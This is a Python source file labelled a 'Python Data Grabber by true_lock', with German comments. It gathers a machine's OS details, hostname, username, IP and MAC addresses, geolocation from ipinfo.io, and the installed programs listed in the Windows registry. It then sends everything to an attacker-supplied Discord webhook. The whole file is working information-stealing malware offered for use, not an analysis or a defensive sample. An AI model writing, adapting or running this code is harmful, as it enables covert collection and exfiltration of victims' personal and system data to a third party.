import socket
import platform
import psutil
import ifaddr
import requests
import netifaces
import getpass
import winreg

def get_system_info():
    system_info = f"System: {platform.system()}\n"
    system_info += f"Release: {platform.release()}\n"
    system_info += f"Version: {platform.version()}\n"
    system_info += f"Machine: {platform.machine()}\n"
    system_info += f"Processor: {platform.processor()}\n"
    system_info += f"RAM: {psutil.virtual_memory().total} bytes\n"
    system_info += f"Computer Name: {socket.gethostname()}\n"
    system_info += f"User: {getpass.getuser()}\n"
    return system_info

def get_ip_addresses():
    ip_info = "IP Addresses:\n"
    for adapter in ifaddr.get_adapters():
        for ip in adapter.ips:
            ip_info += f"- {ip.ip}\n"
    return ip_info

def get_mac_address():
    mac_info = "MAC Address:\n"
    for interface in netifaces.interfaces():
        try:
            mac_address = netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]['addr']
            mac_info += f"- {mac_address}\n"
        except KeyError:
            pass
    return mac_info

def get_device_location():
    try:
        response = requests.get("https://ipinfo.io/json")
        data = response.json()
        location = f"Location: {data['city']}, {data['region']}, {data['country']}\n"
        return location
    except Exception as e:
        print("Failed to fetch device location:", e)
        return ""

def get_installed_programs():
    installed_programs = "Installed Programs:\n"
    uninstall_key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
    excluded_programs = ["Microsoft", "Windows", "Update", "Security", "Hotfix", "KB"]
    
    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, uninstall_key) as key:
        for i in range(winreg.QueryInfoKey(key)[0]):
            subkey_name = winreg.EnumKey(key, i)
            with winreg.OpenKey(key, subkey_name) as subkey:
                try:
                    program_name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                    if any(exclusion in program_name for exclusion in excluded_programs):
                        continue  # Ignoriere Systemprogramme
                    installed_programs += f"- {program_name}\n"
                except FileNotFoundError:
                    continue
    return installed_programs

def send_to_discord(webhook_url):
    # Systeminformationen abrufen
    system_info = get_system_info()

    # IP-Adressen abrufen
    ip_info = get_ip_addresses()

    # MAC-Adresse abrufen
    mac_info = get_mac_address()

    # Standort abrufen
    location_info = get_device_location()

    # Installierte Programme abrufen
    installed_programs = get_installed_programs()

    # Nachricht für Systeminformationen und Netzwerkdetails erstellen
    content = f"<Python Data Grabber by true_lock>\n{system_info}\n{ip_info}\n{mac_info}\n{location_info}\n{installed_programs}"

    # Inhalt für Discord erstellen und senden
    data = {
        "content": content,
        "username": "System Info+Mac+Ip+Location+Programs Grabber"
    }

    response = requests.post(webhook_url, json=data)
    if response.status_code != 200:
        print(f"Request failed with status code {response.status_code}: {response.text}")
    else:
        print("Message sent successfully to Discord.")

# Beispiel für die Verwendung
webhook_url = "YOUR WEBHOOK URL HERE"
send_to_discord(webhook_url)
